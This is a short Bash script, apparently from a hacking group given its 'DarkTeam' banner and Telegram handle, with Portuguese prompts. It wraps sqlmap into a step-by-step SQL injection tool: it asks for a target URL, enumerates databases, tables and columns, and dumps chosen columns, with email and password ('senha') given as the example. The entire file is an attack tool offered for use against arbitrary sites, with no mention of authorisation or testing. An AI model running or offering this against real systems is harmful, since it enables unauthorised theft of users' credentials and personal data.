#!/bin/bash
#coded:TioDark
clear
echo "+---------------------------+"
echo "|     Coded by: TioDark     |"
echo "|      Team: DarkTeam       |"
echo "| Telegram user: @SrRooting |"
echo "|                           |"
echo "+---------------------------+"
read -p "Alvo > " alvo
sqlmap -u $alvo --dbs
echo "Se nao aparecer nenhuma database, apenas saia."
read -p "Database > " database
sqlmap -u $alvo -D $database --tables
read -p "Tabela > " tabela
sqlmap -u $alvo -D $database -T $tabela --columns
echo "Ex: email,senha,nome,usuario"
read -p "Colunas > " colunas
echo "Estraindo Colunas..."
sleep 2
sqlmap -u $alvo -D $database -T $tabela -C $colunas --dump
